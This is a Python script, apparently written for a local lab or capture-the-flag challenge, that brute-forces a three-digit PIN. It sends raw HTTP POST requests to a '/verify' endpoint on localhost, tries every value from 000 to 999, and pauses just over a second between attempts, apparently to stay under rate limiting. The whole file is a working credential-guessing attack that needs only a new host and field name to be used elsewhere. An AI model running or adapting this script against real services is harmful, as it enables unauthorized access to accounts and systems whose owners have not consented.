import socket
import time

def send_post_request(pin):
    host = "localhost"
    port = 8888
    resource = "/verify"

    # Define the form data and current pin guess
    pin_guess = f"{pin:03d}"
    form_data = f"magicNumber={pin_guess}"

    # Create the HTTP request with customized header
    request = (
        f"POST {resource} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(form_data)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"{form_data}"
    )

    # Connect to the server
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((host, port))

    # Send the HTTP request
    client_socket.sendall(request.encode())

    # Receive the response
    response = b""
    while True:
        data = client_socket.recv(4096)
        if not data:
            break
        response += data

    # Close the connection
    client_socket.close()


    # Decode and process the response
    decoded = response.decode(errors="ignore")
    if "Access Granted" in decoded or "Correct" in decoded:
        print(f"SUCCESS! PIN: {pin_guess}")
        return True
    else:
        print(f"Trying PIN: {pin_guess}")
        return False
    
def brute_force_pins():
    for pin in range(1000):
        if send_post_request(pin):
            print(f"Found correct PIN: {pin:03d}")
            break
        time.sleep(1.1)

if __name__ == "__main__":
    brute_force_pins()
